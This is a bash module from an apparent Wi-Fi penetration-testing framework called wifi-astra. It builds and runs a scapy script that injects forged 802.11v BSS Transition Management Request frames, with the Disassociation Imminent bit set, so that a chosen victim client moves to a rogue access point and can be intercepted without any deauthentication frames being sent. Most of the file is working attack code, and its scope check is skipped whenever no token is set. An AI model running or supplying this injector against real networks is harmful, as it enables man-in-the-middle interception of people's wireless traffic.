#!/usr/bin/env bash
# MODULE_META
# NAME="BSS Transition Attack (802.11v)"
# CATEGORY="G"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,python3,scapy"
# DESC="Abuse 802.11v BSS Transition Management to steer clients to a rogue AP without sending deauth frames"
# REQS="monitor_iface,target_ssid,target_bssid"
# PCAP="yes"
# DECODE="wifi_mgmt"
# PROMPTS="target_client,rogue_bssid"

#===============================================================================
#  modules/g5_bss_transition_attack.sh
#  G5: BSS Transition Attack (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use TARGET_CLIENT provided by Go brain.
#  2. Send a 'BSS Transition Management Request' frame to the client.
#  3. The request "recommends" the client move to a new BSSID (our rogue AP).
#  4. This allows for a "polite" MITM attack that does not require deauth.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G5"
# --- Scope Guardrail ---
# Verify this module was launched by the wifi-astra controller.
# Prevents casual direct invocation against unauthorized targets.
if [[ -n "${ASTRA_SCOPE_TOKEN:-}" && -n "${GUEST_BSSID:-}" ]]; then
    if ! "$ASTRA_BIN" verify-scope \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --bssid "$GUEST_BSSID" \
            --token "$ASTRA_SCOPE_TOKEN"; then
        echo "[!] Scope guardrail failed — aborting." >&2
        exit 1
    fi
fi
# (Token absent = headless or legacy mode; guard is skipped but logged)
if [[ -z "${ASTRA_SCOPE_TOKEN:-}" && "${ASTRA_HEADLESS:-}" != "true" ]]; then
    echo "[!] WARNING: ASTRA_SCOPE_TOKEN not set. Run this module via wifi-astra start." >&2
fi
# --- End Scope Guardrail ---
TARGET_CLIENT="${TARGET_CLIENT:-}"
ROGUE_BSSID="${ROGUE_BSSID:-00:11:22:33:44:55}" # From Go brain

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. BSS Transition requires a victim station."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Skipped — No Target Client" \
        --desc "BSS Transition attack was not executed because no target client MAC was specified. Re-run after running A4 (Client Fingerprinting) to identify a roaming-capable station." \
        --severity INFO \
        --rationale "BSS Transition Management Request injection requires a specific client MAC to address the action frame."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting BSS Transition (802.11v) mission for: ${C_VAR}$TARGET_CLIENT${C_RESET}"
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Injecting BTM requests..."

# Execute Active Injection
echo -e "[*] Injecting 802.11v BTM Request to steer ${C_VAR}$TARGET_CLIENT${C_RESET} to ${C_VAR}$ROGUE_BSSID${C_RESET}..."
PYTHON_INJECTOR="${EVIDENCE_DIR}/g5_inject.py"

cat <<EOF > "$PYTHON_INJECTOR"
from scapy.all import *
import sys

target_client = sys.argv[1]
source_ap = sys.argv[2]
rogue_ap = sys.argv[3]
iface = sys.argv[4]

print(f"[*] Sending BTM Request to {target_client} from {source_ap}...")

# 802.11v BSS Transition Management Request
# Type: Management (0), Subtype: 13 (Action)
# Category: WNM (10), Action: BTM Request (7)
#
# BTM Request body:
#   Byte 0: Dialog Token = 1
#   Byte 1: Request Mode = 0x0C
#     Bit 2 (0x04) = Preferred Candidate List Included
#     Bit 3 (0x08) = Disassociation Imminent — tells client it MUST roam; without
#                    this bit clients treat the request as a suggestion and ignore it
#   Bytes 2-3: Disassoc Timer = 0x0064 (100 TUs ≈ 100ms grace period)
#   Byte 4:   Validity Interval = 0xFF (maximum — give client time to associate)
#
# Neighbor Report subelement (ID=52) for the rogue BSSID candidate:
#   Subelement ID: 52 (0x34)
#   Length: 13
#   BSSID: 6 bytes
#   BSSID Info: 0x0000008F (reachability=3, security=1, key_scope=1, cap_spectrum_mgmt=1)
#   Operating Class: 81 (2.4GHz channels 1-13)
#   Channel Number: 6
#   PHY Type: 4 (ERP, 802.11g)
rogue_bytes = bytes.fromhex(rogue_ap.replace(":", ""))
bssid_info = b"\x8f\x00\x00\x00"   # little-endian BSSID Info
neighbor = bytes([0x34, 13]) + rogue_bytes + bssid_info + bytes([81, 6, 4])

payload = bytes([1, 0x0C, 0x64, 0x00, 0xFF]) + neighbor

pkt = RadioTap() / Dot11(addr1=target_client, addr2=source_ap, addr3=source_ap) / \
      Dot11Action(category=10, action=7) / \
      Raw(load=payload)

sendp(pkt, iface=iface, count=15, inter=0.1, verbose=0)
print("[+] BTM Request frames sent (Disassociation Imminent mode).")
EOF

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" || true
else
    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
fi

# Reporting
echo -e "[+] Transition injection complete."
"$ASTRA_BIN" record-finding \
    --session-dir "$SESSION_DIR" \
    --tc "$TC_ID" \
    --type vulnerability \
    --name "BSS Transition Injection Executed" \
    --severity HIGH \
    --desc "Injected 802.11v BTM Request frames to steer client $TARGET_CLIENT to $ROGUE_BSSID." \
    --target "$TARGET_CLIENT" \
    --evidence "$PYTHON_INJECTOR" \
    --rationale "Abusing 802.11v allows for 'silent' MITM positioning."

# 🏁 FINAL SIGNAL
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
